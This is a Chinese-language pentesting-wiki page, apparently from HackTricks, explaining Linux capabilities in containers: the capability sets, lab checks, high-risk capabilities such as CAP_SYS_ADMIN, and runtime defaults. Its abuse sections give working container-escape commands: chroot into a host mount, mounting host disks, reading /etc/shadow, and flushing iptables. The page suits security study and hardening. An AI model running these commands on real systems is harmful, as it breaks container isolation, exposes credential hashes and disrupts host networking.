# 容器中的 Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux capabilities 是容器安全中最重要的部分之一，因为它们回答了一个微妙但根本的问题：**在容器内部“root”究竟意味着什么？** 在普通的 Linux 系统上，UID 0 历史上意味着非常广泛的权限集。在现代内核中，这些权限被分解为称为 capabilities 的更小单元。一个进程即使以 root 身份运行，如果相关的 capabilities 被移除，仍可能缺乏许多强大的操作能力。

容器非常依赖这种区分。许多工作负载仍为了兼容性或简单性而在容器内以 UID 0 启动。如果不丢弃 capabilities，那将非常危险。通过丢弃 capabilities，容器内的 root 进程仍然可以执行许多普通的容器内任务，同时被拒绝更敏感的内核操作。这就是为什么一个显示 `uid=0(root)` 的容器 shell 并不自动意味着“host root”或甚至“广泛的内核权限”。capability 集合决定了这个 root 身份实际值多少。

有关完整的 Linux capability 参考以及大量滥用示例，请参见：

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 工作原理

Capabilities 在多个集合中跟踪，包括 permitted、effective、inheritable、ambient 和 bounding 集合。对于许多容器评估来说，每个集合的确切内核语义可能不如最终的实际问题重要：**这个进程现在能够成功执行哪些特权操作，将来还可能获得哪些权限提升？**

之所以重要，是因为许多容器逃逸技术实际上是伪装成容器问题的 capability 问题。拥有 `CAP_SYS_ADMIN` 的工作负载可以访问大量内核功能，而这些功能是普通容器 root 进程不应接触的。如果工作负载具有 `CAP_NET_ADMIN`，并且还共享了 host network namespace，则变得更危险。如果工作负载具有 `CAP_SYS_PTRACE`，并且可以通过 host PID 共享看到 host 进程，则也会变得更有趣。在 Docker 或 Podman 中这可能表现为 `--pid=host`；在 Kubernetes 中通常表现为 `hostPID: true`。

换句话说，capability 集合不能孤立评估。必须将其与 namespaces、seccomp 和 MAC policy 一并读取。

## 实验

一个非常直接的方法来检查容器内的 capabilities 是：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
您也可以将更受限的容器与已添加所有 capabilities 的容器进行比较：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
要查看一次最小范围添加的效果，尝试先删除所有内容，然后只添加回一个 capability：
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
这些小实验表明，运行时并不是简单地切换一个名为 "privileged" 的布尔值。它在塑造进程可用的实际权限面。

## 高风险 Capabilities（权限）

虽然哪些 capabilities 是否重要取决于目标，但在容器逃逸分析中，有少数几项经常相关。

**`CAP_SYS_ADMIN`** 是防御方最应怀疑的一个。它通常被描述为“新的 root”，因为它解锁了大量功能，包括与 mount 相关的操作、对 namespace 敏感的行为，以及许多不应随意暴露给容器的 kernel 路径。如果容器具有 `CAP_SYS_ADMIN`、seccomp 配置薄弱且没有强的 MAC 限制，许多经典的突破路径就会变得更现实。

**`CAP_SYS_PTRACE`** 在存在进程可见性时很重要，尤其是当 PID namespace 与 host 或有价值的邻近工作负载共享时。它可以把可见性变为篡改。

**`CAP_NET_ADMIN`** 和 **`CAP_NET_RAW`** 在以网络为中心的环境中很重要。在一个隔离的 bridge network 上它们可能已经有风险；在共享的 host network namespace 上则更糟，因为工作负载可能能够重新配置 host 网络、嗅探、伪装或干扰本地流量。

**`CAP_SYS_MODULE`** 在有 root 的环境中通常是灾难性的，因为加载 kernel modules 实际上等同于对 host 内核的控制。它几乎不应该出现在通用容器工作负载中。

## 运行时 用法

Docker、Podman、基于 containerd 的堆栈和 CRI-O 都使用 capability 控制，但默认值和管理接口各不相同。Docker 通过诸如 `--cap-drop` 和 `--cap-add` 的标志直接暴露这些控制。Podman 也暴露类似的控制，并且常常通过 rootless 执行获得额外的安全层。Kubernetes 通过 Pod 或容器的 `securityContext` 展示 capability 的添加和移除。像 LXC/Incus 这样的 system-container 环境也依赖于 capability 控制，但这些系统与主机更紧密的集成常常诱使运维人员比在 app-container 环境中更激进地放宽默认设置。

相同的原则适用于所有这些：技术上可以授予的 capability 并不一定应该被授予。许多真实世界的事故始于运维人员仅因为在更严格的配置下工作负载运行失败，就添加了一个 capability，以便快速修复。

## 错误配置

最明显的错误是在 Docker/Podman 风格的 CLI 中使用 **`--cap-add=ALL`**，但这不是唯一的问题。实际上，更常见的问题是授予一两个极其强大的 capability，尤其是 `CAP_SYS_ADMIN`，以“让应用工作”，却没有同时理解 namespace、seccomp 和 mount 的影响。另一种常见的失败模式是将额外的 capabilities 与 host namespace 共享结合使用。在 Docker 或 Podman 中，这可能表现为 `--pid=host`、`--network=host` 或 `--userns=host`；在 Kubernetes 中，等效的暴露通常通过工作负载设置出现，例如 `hostPID: true` 或 `hostNetwork: true`。这些组合中的每一种都会改变该 capability 实际可以影响的范围。

管理员也常常认为，由于工作负载并非完全 `--privileged`，因此它仍然受到有意义的限制。这有时是对的，但有时实际的态势已经接近 privileged，以至于这种区别在运维上不再重要。

## 滥用

第一个实用步骤是枚举实际的 capability 集合，并立即测试那些对 escape 或主机信息访问有意义的 capability 特定操作：
```bash
capsh --print
grep '^Cap' /proc/self/status
```
如果存在 `CAP_SYS_ADMIN`，应首先测试基于 mount 的滥用和宿主文件系统访问，因为这是最常见的 breakout 使能之一：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
如果容器具有 `CAP_SYS_PTRACE` 且能够看到感兴趣的进程，请验证是否可以将该能力用于进程检查：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW`，测试该 workload 是否可以操纵可见的网络堆栈或至少收集有用的网络情报：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
当 capability 测试成功时，将其与命名空间的情况结合考虑。一个在隔离命名空间中看起来仅有风险的 capability，一旦容器还共享 host PID、host network 或 host mounts，就可能立即成为 escape 或 host-recon primitive。

### 完整示例: `CAP_SYS_ADMIN` + Host Mount = Host Escape

如果容器具有 `CAP_SYS_ADMIN` 且对宿主文件系统有可写的 bind mount（例如 `/host`），则 escape path 通常很直接：
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
如果 `chroot` 成功，命令现在在宿主机的根文件系统上下文中执行：
```bash
id
hostname
cat /etc/shadow | head
```
如果 `chroot` 不可用，通常可以通过在挂载的目录树中调用 binary 来达到相同的效果：
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完整示例：`CAP_SYS_ADMIN` + 设备访问

如果主机的块设备被暴露，`CAP_SYS_ADMIN` 可以将其变为直接的主机文件系统访问:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完整示例：`CAP_NET_ADMIN` + 主机网络

这种组合并不总是直接产生主机 root，但它可以完全重新配置主机的网络栈：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这可能使得能够进行 denial of service、traffic interception，或访问先前被过滤的服务。

## Checks

capability checks 的目标不仅仅是导出原始值，而是要判断进程是否拥有足够的权限，使其当前的 namespace 和 mount 情况变得危险。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
这里有几点值得注意：

- `capsh --print` 是识别高风险 capabilities（例如 `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin` 或 `cap_sys_module`）的最简单方法。
- `CapEff` 行在 `/proc/self/status` 告诉你当前实际生效的内容，而不仅仅是其他集合中可能可用的。
- 如果容器还共享 host PID、network 或 user namespaces，或有可写的 host 挂载点，那么 capability dump 就变得更重要。

在收集原始 capability 信息之后，下一步是解读。要问的是：进程是否为 root、user namespaces 是否启用、host namespaces 是否被共享、seccomp 是否在生效、以及 AppArmor 或 SELinux 是否仍然限制该进程。单独的 capability 集合只是整体情况的一部分，但它常常是解释为什么在相同初始条件下一个 container breakout 成功而另一个失败的关键。

## 运行时默认

| Runtime / platform | 默认状态 | 默认行为 | 常见手动放宽方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用受限的 capability 集合 | Docker 保持一份默认的允许列表并丢弃其他 capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 默认使用受限的 capability 集合 | Podman 容器默认是 unprivileged，并使用受限的 capability 模型 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 继承运行时默认值，除非更改 | 如果未指定 `securityContext.capabilities`，容器将获得来自运行时的默认 capability 集合 | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | 通常为运行时默认 | 实际生效的集合取决于运行时加上 Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

对于 Kubernetes，关键点是 API 并不定义一个通用的默认 capability 集合。如果 Pod 没有添加或删除 capabilities，工作负载将继承该节点的运行时默认值。
